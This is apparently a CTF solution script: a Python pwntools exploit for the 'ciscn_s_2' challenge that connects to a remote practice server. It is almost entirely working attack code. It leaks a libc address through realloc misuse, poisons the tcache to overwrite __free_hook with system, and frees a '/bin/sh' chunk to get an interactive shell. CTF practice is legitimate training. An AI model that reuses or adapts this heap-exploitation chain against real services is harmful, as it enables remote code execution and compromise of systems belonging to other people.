# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_s_2'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27106'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text = 'a'):
    cmd(1)
    sla('size?>' , size)
    sa('content:' , text)

def add_0(size ):
    cmd(1)
    sla('size?>' , size)

def edit(idx , text):
    cmd(2)
    sla('Index:' , idx)
    sla('content:' , text)

def edit_0(idx ):
    cmd(2)
    sla('Index:' , idx)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(4)
    sla(':' , idx)

# one_gad = one_gadget(libc.path)
# 在size 等于 0 时，realloc 还可以 free 捏

def attack():
    

    add(0x418)
    add(0)
    delete(0)
    add(0x418 , '\x30')
    show(0)

    __malloc_hook = l64()
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    edit_0(1)
    delete(1)

    add(0x18 , p64(__free_hook - 8))
    add(0x18 , flat('/bin/sh\x00' , system_addr))
    delete(2)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_s_2.py
@Time    :   2022/02/10 19:33:53
@Author  :   Niyah 
'''